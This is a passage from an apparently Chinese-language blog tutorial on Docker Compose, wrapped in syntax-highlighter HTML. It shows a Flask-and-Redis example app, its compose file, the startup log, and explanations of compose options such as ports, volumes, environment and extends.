class=\"crayon-h\"> </span><span class=\"crayon-e\">hello</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c51291884198-4\"><span class=\"crayon-h\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">incr</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'hits'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-st\">return</span><span class=\"crayon-s\">'Hello World! I have been seen %s times.'</span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'hits'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">__name__</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-s\">\"__main__\"</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c51291884198-5\"><span class=\"crayon-h\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class=\"crayon-v\">app</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">run</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">host</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"0.0.0.0\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">debug</span><span class=\"crayon-o\">=</span><span class=\"crayon-t\">True</span><span class=\"crayon-sy\">)</span></div></div></td>\n\t\t\t\t\t</tr>\n\t\t\t\t</tbody></table>\n\t\t\t</div>\n\t\t</div>\n<!-- [Format Time: 0.0027 seconds] -->\n<p></p>\n<p><strong>第二步</strong>，用一个compose.yaml来定义你的应用服务，他们可以把不同的服务生成不同的容器中组成你的应用。</p>\n<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->\n\n\t\t<div id=\"crayon-580270f9a8c55508636029\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\">\n\t\t\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly=\"\" style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">web:\n  build:.\n  command: python app.py\n  ports:\n         - \"5000:5000\"\n  volumes:\n         - .:/code\n  links:\n         - redis\nredis:\n  image: redis</textarea></div>\n\t\t\t<div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\">\n\t\t\t\t<table class=\"crayon-table\">\n\t\t\t\t\t<tbody><tr class=\"crayon-row\">\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c55508636029-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c55508636029-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c55508636029-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c55508636029-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c55508636029-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c55508636029-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c55508636029-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c55508636029-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c55508636029-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c55508636029-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c55508636029-11\">11</div></div>\n\t\t\t\t</td>\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c55508636029-1\"><span class=\"crayon-s \">web</span><span class=\"\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c55508636029-2\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">build</span><span class=\"\">:.</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c55508636029-3\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">command</span><span class=\"\">: python app.py</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c55508636029-4\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">ports</span><span class=\"\">:</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c55508636029-5\"><span class=\"crayon-h\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>-<span class=\"crayon-h\"> </span><span class=\"crayon-i \">\"5000:5000\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c55508636029-6\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">volumes</span><span class=\"\">:</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c55508636029-7\"><span class=\"crayon-h\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>-<span class=\"crayon-h\"> </span><span class=\"crayon-o\">.</span><span class=\"\">:/code</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c55508636029-8\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">links</span><span class=\"\">:</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c55508636029-9\"><span class=\"crayon-h\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>-<span class=\"crayon-h\"> </span>redis</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c55508636029-10\"><span class=\"crayon-s \">redis</span><span class=\"\">:</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c55508636029-11\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">image</span><span class=\"\">: redis</span></div></div></td>\n\t\t\t\t\t</tr>\n\t\t\t\t</tbody></table>\n\t\t\t</div>\n\t\t</div>\n<!-- [Format Time: 0.0007 seconds] -->\n<p></p>\n<p><strong>第三步</strong>，执行<code>docker-compose up</code>来启动你的应用，它会根据compose.yaml的设置来pull/run这俩个容器，然后再启动。</p>\n<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->\n\n\t\t<div id=\"crayon-580270f9a8c5a806091571\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\">\n\t\t\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly=\"\" style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">Creating myapp_redis_1...\nCreating myapp_web_1...\nBuilding web...\nStep 0 : FROM python:2.7\n2.7: Pulling from python\n...\nStatus: Downloaded newer image for python:2.7\n ---&gt; d833e0b23482\nStep 1 : ADD . /code\n ---&gt; 1c04b1b15808\nRemoving intermediate container 9dab91b4410d\nStep 2 : WORKDIR /code\n ---&gt; Running in f495a62feac9\n ---&gt; ffea89a7b090\nAttaching to myapp_redis_1, myapp_web_1\n......\nredis_1 | [1] 17 May 10:42:38.147 * The server is now ready to accept connections on port 6379\nweb_1   |  * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)\nweb_1   |  * Restarting with stat</textarea></div>\n\t\t\t<div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\">\n\t\t\t\t<table class=\"crayon-table\">\n\t\t\t\t\t<tbody><tr class=\"crayon-row\">\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c5a806091571-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c5a806091571-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c5a806091571-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c5a806091571-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c5a806091571-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c5a806091571-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c5a806091571-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c5a806091571-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c5a806091571-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-19\">19</div></div>\n\t\t\t\t</td>\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-1\"><span class=\"crayon-e\">Creating </span><span class=\"crayon-v\">myapp_redis_1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c5a806091571-2\"><span class=\"crayon-e\">Creating </span><span class=\"crayon-v\">myapp_web_1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-3\"><span class=\"crayon-e\">Building </span><span class=\"crayon-v\">web</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c5a806091571-4\"><span class=\"crayon-i\">Step</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">FROM </span><span class=\"crayon-v\">python</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">2.7</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-5\"><span class=\"crayon-cn\">2.7</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Pulling </span><span class=\"crayon-e\">from </span><span class=\"crayon-i\">python</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c5a806091571-6\"><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-7\"><span class=\"crayon-v\">Status</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Downloaded </span><span class=\"crayon-e\">newer </span><span class=\"crayon-e\">image </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">python</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">2.7</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c5a806091571-8\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">d833e0b23482</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-9\"><span class=\"crayon-i\">Step</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">ADD</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">code</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c5a806091571-10\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1c04b1b15808</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-11\"><span class=\"crayon-e\">Removing </span><span class=\"crayon-e\">intermediate </span><span class=\"crayon-i\">container</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9dab91b4410d</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c5a806091571-12\"><span class=\"crayon-i\">Step</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">WORKDIR</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">code</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-13\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Running </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">f495a62feac9</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c5a806091571-14\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ffea89a7b090</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-15\"><span class=\"crayon-e\">Attaching </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">myapp_redis_1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">myapp_web</span><span class=\"crayon-sy\">_</span>1</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c5a806091571-16\"><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-17\"><span class=\"crayon-v\">redis_1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">17</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">May</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">42</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">38.147</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">The </span><span class=\"crayon-e\">server </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">now </span><span class=\"crayon-e\">ready </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">accept </span><span class=\"crayon-e\">connections </span><span class=\"crayon-e\">on </span><span class=\"crayon-i\">port</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6379</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c5a806091571-18\"><span class=\"crayon-v\">web_1</span><span class=\"crayon-h\">&nbsp;&nbsp; </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Running </span><span class=\"crayon-e\">on </span><span class=\"crayon-v\">http</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//0.0.0.0:5000/ (Press CTRL+C to quit)</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-19\"><span class=\"crayon-v\">web_1</span><span class=\"crayon-h\">&nbsp;&nbsp; </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Restarting </span><span class=\"crayon-e\">with </span><span class=\"crayon-v\">stat</span></div></div></td>\n\t\t\t\t\t</tr>\n\t\t\t\t</tbody></table>\n\t\t\t</div>\n\t\t</div>\n<!-- [Format Time: 0.0039 seconds] -->\n<p></p>\n<h2>3. Yaml文件参考</h2>\n<p>在上面的yaml文件中，我们可以看到compose文件的基本结构。首先是定义一个服务名，下面是yaml服务中的一些选项条目：<br>\n<code>image</code>:镜像的ID<br>\n<code>build</code>:直接从pwd的Dockerfile来build，而非通过image选项来pull<br>\n<code>links</code>：连接到那些容器。每个占一行，格式为SERVICE[:ALIAS],例如 – db[:database]<br>\n<code>external_links</code>：连接到该compose.yaml文件之外的容器中，比如是提供共享或者通用服务的容器服务。格式同links<br>\n<code>command</code>：替换默认的command命令<br>\n<code>ports</code>: 导出端口。格式可以是：</p>\n<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->\n\n\t\t<div id=\"crayon-580270f9a8c61341321587\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\">\n\t\t\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly=\"\" style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">ports:-\"3000\"-\"8000:8000\"-\"127.0.0.1:8001:8001\"</textarea></div>\n\t\t\t<div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\">\n\t\t\t\t<table class=\"crayon-table\">\n\t\t\t\t\t<tbody><tr class=\"crayon-row\">\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c61341321587-1\">1</div></div>\n\t\t\t\t</td>\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c61341321587-1\"><span class=\"crayon-v\">ports</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">-</span><span class=\"crayon-s\">\"3000\"</span><span class=\"crayon-o\">-</span><span class=\"crayon-s\">\"8000:8000\"</span><span class=\"crayon-o\">-</span><span class=\"crayon-s\">\"127.0.0.1:8001:8001\"</span></div></div></td>\n\t\t\t\t\t</tr>\n\t\t\t\t</tbody></table>\n\t\t\t</div>\n\t\t</div>\n<!-- [Format Time: 0.0005 seconds] -->\n<p></p>\n<p><code>expose</code>：导出端口，但不映射到宿主机的端口上。它仅对links的容器开放。格式直接指定端口号即可。<br>\n<code>volumes</code>：加载路径作为卷，可以指定只读模式：</p>\n<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->\n\n\t\t<div id=\"crayon-580270f9a8c65962076142\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\">\n\t\t\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly=\"\" style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">volumes:-/var/lib/mysql\n - cache/:/tmp/cache\n -~/configs:/etc/configs/:ro</textarea></div>\n\t\t\t<div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\">\n\t\t\t\t<table class=\"crayon-table\">\n\t\t\t\t\t<tbody><tr class=\"crayon-row\">\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c65962076142-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c65962076142-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c65962076142-3\">3</div></div>\n\t\t\t\t</td>\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c65962076142-1\"><span class=\"crayon-v\">volumes</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">mysql</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c65962076142-2\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cache</span><span class=\"crayon-o\">/</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">tmp</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">cache</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c65962076142-3\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">~</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">configs</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">configs</span><span class=\"crayon-o\">/</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">ro</span></div></div></td>\n\t\t\t\t\t</tr>\n\t\t\t\t</tbody></table>\n\t\t\t</div>\n\t\t</div>\n<!-- [Format Time: 0.0009 seconds] -->\n<p></p>\n<p><code>volumes_from</code>：加载其他容器或者服务的所有卷</p>\n<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->\n\n\t\t<div id=\"crayon-580270f9a8c69471704775\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\">\n\t\t\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly=\"\" style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">environment:- RACK_ENV=development\n  - SESSION_SECRET</textarea></div>\n\t\t\t<div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\">\n\t\t\t\t<table class=\"crayon-table\">\n\t\t\t\t\t<tbody><tr class=\"crayon-row\">\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c69471704775-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c69471704775-2\">2</div></div>\n\t\t\t\t</td>\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c69471704775-1\"><span class=\"crayon-v\">environment</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">RACK_ENV</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">development</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c69471704775-2\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">SESSION_SECRET</span></div></div></td>\n\t\t\t\t\t</tr>\n\t\t\t\t</tbody></table>\n\t\t\t</div>\n\t\t</div>\n<!-- [Format Time: 0.0005 seconds] -->\n<p></p>\n<p><code>env_file</code>：从一个文件中导入环境变量，文件的格式为RACK_ENV=development<br>\n<code>extends</code>:扩展另一个服务，可以覆盖其中的一些选项。一个sample如下：</p>\n<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->\n\n\t\t<div id=\"crayon-580270f9a8c6e528736605\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\">\n\t\t\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly=\"\" style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">common.yml\nwebapp:\n  build:./webapp\n  environment:- DEBUG=false- SEND_EMAILS=false\ndevelopment.yml\nweb:extends:\n    file: common.yml\n    service: webapp\n  ports:-\"8000:8000\"\n  links:- db\n  environment:- DEBUG=true\ndb:\n  image: postgres</textarea></div>\n\t\t\t<div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\">\n\t\t\t\t<table class=\"crayon-table\">\n\t\t\t\t\t<tbody><tr class=\"crayon-row\">\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c6e528736605-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c6e528736605-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c6e528736605-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c6e528736605-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c6e528736605-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c6e528736605-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c6e528736605-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c6e528736605-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c6e528736605-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c6e528736605-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c6e528736605-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c6e528736605-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c6e528736605-13\">13</div></div>\n\t\t\t\t</td>\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c6e528736605-1\">common<span class=\"crayon-o\">.</span>yml</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c6e528736605-2\"><span class=\"crayon-s \">webapp</span><span class=\"\">:</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c6e528736605-3\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">build</span><span class=\"\">:./webapp</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c6e528736605-4\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s 